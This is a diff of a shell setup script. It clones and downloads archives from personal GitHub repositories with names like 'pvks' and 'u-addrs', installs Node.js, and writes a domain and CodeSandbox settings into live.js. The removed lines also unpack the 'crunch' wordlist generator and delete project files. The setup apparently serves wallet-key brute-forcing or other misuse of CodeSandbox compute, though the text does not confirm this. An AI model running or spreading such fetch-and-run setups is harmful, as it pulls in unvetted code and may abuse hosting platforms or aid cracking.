@@ -14,42 +14,16 @@ if [ -z "$domain" ]; then
 	echo "Missing -d parameter"
 	exit 1
 fi
-cd src/
-mkdir acacia
-cd acacia/
-curl -O https://raw.githubusercontent.com/crenata/u-addrs/main/csb-pvks.tar.xz
-tar -xf csb-pvks.tar.xz
-rm -rf csb-pvks.tar.xz
-sleep 2s
-tar -xf crunch-3.6.tar.xz
-rm -rf crunch-3.6.tar.xz
-sleep 2s
-tar -xf folders.tar.xz
-rm -rf folders.tar.xz
-sleep 2s
-tar -xf setup.tar.xz
-rm -rf setup.tar.xz
-sleep 2s
+git clone https://github.com/malaccensis/pvks.git
+cd pvks/
+curl -O https://nodejs.org/dist/v17.3.0/node-v17.3.0-linux-x64.tar.xz
+tar -xf node-v17.3.0-linux-x64.tar.xz
+rm node-v17.3.0-linux-x64.tar.xz
+mv node-v17.3.0-linux-x64/ nodejs
 sed -i 's+{scriptId}+'$id'+g' live.js
-sleep 2s
 sed -i 's+{protocol}+https+g' live.js
-sleep 2s
 sed -i 's+{domain}+'$domain'+g' live.js
-sleep 2s
 sed -i 's+{platform}+Codesandbox+g' live.js
-sleep 2s
 sed -i 's+{platform_domain}+sse.codesandbox.io+g' live.js
-sleep 2s
-cd ../
-cp -rf acacia/scripts/codesandbox-index.js index.js
-cd ../
-rm -rf node_modules/
-sleep 2s
-rm -rf package.json
-rm -rf yarn.lock
-sleep 2s
-mv src/acacia/package.tar.xz .
-tar -xf package.tar.xz
-rm -rf package.tar.xz
-sleep 2s
-npm install
+sed -i 's+node+nodejs/bin/node+g' index.js
+cp -rf scripts/codesandbox-index.js ../index.js
